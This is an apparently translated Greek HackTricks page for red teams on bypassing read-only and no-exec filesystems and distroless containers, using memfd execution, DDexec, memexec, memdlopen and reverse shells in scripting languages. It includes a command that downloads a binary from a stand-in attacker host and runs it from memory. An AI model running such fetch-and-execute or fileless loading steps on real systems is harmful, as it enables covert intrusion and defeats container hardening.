# Παράκαμψη προστασίας FS: μόνο για ανάγνωση / χωρίς εκτέλεση / Distroless

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Αν σας ενδιαφέρει η **καριέρα στο χάκινγκ** και το χάκαρισμα του αδύνατου - **σας προσλαμβάνουμε!** (_απαιτείται άριστη γνώση γραπτού και προφορικού Πολωνικών_).

{% embed url="https://www.stmcyber.com/careers" %}

## Βίντεο

Στα παρακάτω βίντεο μπορείτε να βρείτε τεχνικές που αναφέρονται σε αυτήν τη σελίδα εξηγημένες πιο αναλυτικά:

* [**DEF CON 31 - Εξερευνώντας τη Μετασχηματισμό Μνήμης Linux για Κρυψώνες και Αποφυγή**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Κρυφές εισβολές με το DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Σενάριο μόνο για ανάγνωση / χωρίς εκτέλεση

Είναι όλο και πιο συνηθισμένο να βρίσκουμε μηχανές Linux που έχουν τοποθετηθεί με προστασία **μόνο για ανάγνωση (ro) του συστήματος αρχείων**, ειδικά σε containers. Αυτό συμβαίνει επειδή για να τρέξετε ένα container με ro σύστημα αρχείων είναι τόσο εύκολο όσο το να ορίσετε **`readOnlyRootFilesystem: true`** στο `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ωστόσο, ακόμα κι αν το σύστημα αρχείων είναι τοποθετημένο ως ro, το **`/dev/shm`** θα παραμείνει εγγράψιμο, οπότε είναι ψεύτικο ότι δεν μπορούμε να γράψουμε τίποτα στο δίσκο. Ωστόσο, αυτός ο φάκελος θα είναι **τοποθετημένος με προστασία χωρίς εκτέλεση**, οπότε αν κατεβάσετε ένα δυαδικό αρχείο εδώ **δεν θα μπορείτε να το εκτελέσετε**.

{% hint style="warning" %}
Από την οπτική γωνία μιας κόκκινης ομάδας, αυτό κάνει **πιο περίπλοκο το να κατεβάσετε και να εκτελέσετε** δυαδικά που δεν υπάρχουν ήδη στο σύστημα (όπως backdoors ή enumerators όπως το `kubectl`).
{% endhint %}

## Ευκολότερη παράκαμψη: Σενάρια

Σημειώστε ότι ανέφερα δυαδικά, μπορείτε να **εκτελέσετε οποιοδήποτε σενάριο** όσο το διερμηνέας βρίσκεται μέσα στη μηχανή, όπως ένα **shell script** αν το `sh` είναι παρόν ή ένα **σενάριο python** αν έχει εγκατασταθεί το `python`.

Ωστόσο, αυτό δεν είναι αρκετό μόνο για να εκτελέσετε το δυαδικό backdoor σας ή άλλα δυαδικά εργαλεία που ίσως χρειαστεί να τρέξετε.

## Παρακάμψεις Μνήμης

Αν θέλετε να εκτελέσετε ένα δυαδικό αλλά το σύστημα αρχείων δεν το επιτρέπει, ο καλύτερος τρόπος να το κάνετε είναι με το **να το εκτελέσετε από τη μνήμη**, καθώς οι **προστασίες δεν ισχύουν εκεί**.

### Παράκαμψη FD + exec syscall

Αν έχετε ισχυρούς μηχανισμούς σεναρίων μέσα στη μηχανή, όπως **Python**, **Perl** ή **Ruby**, μπορείτε να κατεβάσετε το δυαδικό για εκτέλεση από τη μνήμη, να το αποθηκεύσετε σε έναν περιγραφέα αρχείου μνήμης (`create_memfd` syscall), ο οποίος δεν θα προστατεύεται από αυτές τις προστασίες, και στη συνέχεια να καλέσετε ένα **`exec` syscall** δείχνοντας το **fd ως το αρχείο προς εκτέλεση**.

Για αυτό μπορείτε εύκολα να χρησιμοποιήσετε το έργο [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Μπορείτε να του περάσετε ένα δυαδικό και θα δημιουργήσει ένα σενάριο στην καθορισμένη γλώσσα με το **δυαδικό συμπιεσμένο και κωδικοποιημένο σε b64** με οδηγίες για το **αποκωδικοποίηση και αποσυμπίεση** του σε ένα **fd** που δημιουργείται καλώντας την κλήση συστήματος `create_memfd` και μια κλήση στο **exec** syscall για να το εκτελέσει.

{% hint style="warning" %}
Αυτό δεν λειτουργεί σε άλλες γλώσσες σεναρίων όπως PHP ή Node επειδή δεν έχουν κανέναν **προεπιλεγμένο τρόπο να καλέσουν raw syscalls** από ένα σενάριο, οπότε δεν είναι δυνατό να καλέσουν το `create_memfd` για να δημιουργήσουν το **fd μνήμης** για να αποθηκεύσουν το δυαδικό.

Επιπλέον, η δημιουργία ενός **κανονικού fd** με ένα αρχείο στο `/dev/shm` δεν θα λειτουργήσει, καθώς δεν θα σας επιτραπεί να το εκτελέσετε λόγω της **προστασίας χωρίς εκτέλεση** που θα εφαρμοστεί.
{% endhint %}

### DDexec / EverythingExec

Το [**DDexec / EverythingExec**](https://github.com/arget13/DDexec) είναι μια τεχνική που σάς επιτρέπει να **τροποποιήσετε τη μνήμη της δικής σας διεργασίας** με το να αντικαθιστάτε το **`/proc/self/mem`** της.

Έτσι, **ελέγχοντας τον κώδικα συναρμολόγησης** που εκτελείται από τη διεργασία, μπορείτε να γράψετε ένα **shellcode** και "μεταλλάσσετε" τη διεργασία για να **εκτελέσετε οποιοδήποτε αυθαίρετο κώδικα**.

{% hint style="success" %}
Το **DDexec / EverythingExec** θα σας επιτρέψει να φορτώσετε και να **εκτελέσετε** το δικό σας **shellcode** ή **οποιοδήποτε δυαδικό** από τη **μνήμη**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
### MemExec

[**Memexec**](https://github.com/arget13/memexec) είναι το φυσικό επόμενο βήμα του DDexec. Είναι ένα **DDexec shellcode demonised**, οπότε κάθε φορά που θέλετε να **εκτελέσετε ένα διαφορετικό δυαδικό** δεν χρειάζεται να ξαναξεκινήσετε το DDexec, μπορείτε απλά να εκτελέσετε το shellcode memexec μέσω της τεχνικής DDexec και στη συνέχεια **να επικοινωνήσετε με αυτό το δαίμονα για να περάσετε νέα δυαδικά για φόρτωση και εκτέλεση**.

Μπορείτε να βρείτε ένα παράδειγμα για το πώς να χρησιμοποιήσετε το **memexec για να εκτελέσετε δυαδικά από ένα αντίστροφο κέλυφος PHP** στο [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Με παρόμοιο σκοπό με το DDexec, η τεχνική [**memdlopen**](https://github.com/arget13/memdlopen) επιτρέπει έναν **ευκολότερο τρόπο φόρτωσης δυαδικών** στη μνήμη για να τα εκτελέσετε αργότερα. Μπορεί ακόμη να επιτρέψει τη φόρτωση δυαδικών με εξαρτήσεις.

## Διάβρωση Distroless

### Τι είναι το distroless

Τα δοχεία Distroless περιέχουν μόνο τα **απαραίτητα ελάχιστα στοιχεία που απαιτούνται για την εκτέλεση μιας συγκεκριμένης εφαρμογής ή υπηρεσίας**, όπως βιβλιοθήκες και εξαρτήσεις χρόνου εκτέλεσης, αλλά εξαιρούν μεγαλύτερα στοιχεία όπως ένας διαχειριστής πακέτων, κέλυφος ή διατηρητές συστήματος.

Ο στόχος των δοχείων Distroless είναι να **μειώσουν την επιφάνεια επίθεσης των δοχείων εξαλείφοντας τα περιττά στοιχεία** και μειώνοντας τον αριθμό των ευπαθειών που μπορούν να εκμεταλλευτούν.

### Αντίστροφο Κέλυφος

Σε ένα δοχείο Distroless ενδέχεται να **μην βρείτε ούτε το `sh` ούτε το `bash`** για να λάβετε ένα κανονικό κέλυφο. Δεν θα βρείτε επίσης δυαδικά όπως `ls`, `whoami`, `id`... όλα όσα συνήθως εκτελείτε σε ένα σύστημα.

{% hint style="warning" %}
Συνεπώς, **δεν** θα μπορέσετε να λάβετε ένα **αντίστροφο κέλυφος** ή να **απαριθμήσετε** το σύστημα όπως συνήθως κάνετε.
{% endhint %}

Ωστόσο, αν το περιορισμένο δοχείο εκτελεί, για παράδειγμα, έναν ιστό flask, τότε το python είναι εγκατεστημένο, και συνεπώς μπορείτε να αποκτήσετε ένα **αντίστροφο κέλυφος Python**. Αν εκτελείτε node, μπορείτε να αποκτήσετε ένα Node αντίστροφο κέλυφο, και το ίδιο με σχεδόν οποιαδήποτε **γλώσσα σεναρίωσης**.

{% hint style="success" %}
Χρησιμοποιώντας τη γλώσσα σεναρίωσης μπορείτε να **απαριθμήσετε το σύστημα** χρησιμοποιώντας τις δυνατότητες της γλώσσας.
{% endhint %}

Αν δεν υπάρχουν **προστασίες `read-only/no-exec`** μπορείτε να καταχραστείτε το αντίστροφο κέλυφός σας για να **γράψετε στο σύστημα αρχείων τα δυαδικά σας** και να τα **εκτελέσετε**.

{% hint style="success" %}
Ωστόσο, σε αυτού του είδους τα δοχεία αυτές οι προστασίες συνήθως υπάρχουν, αλλά μπορείτε να χρησιμοποιήσετε τις **προηγούμενες τεχνικές εκτέλεσης μνήμης για να τις παρακάμψετε**.
{% endhint %}

Μπορείτε να βρείτε **παραδείγματα** για το **εκμετάλλευση ορισμένων ευπαθειών RCE** για να λάβετε αντίστροφα κέλυφα γλωσσών σεναρίωσης και να εκτελέσετε δυαδικά από τη μνήμη στο [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
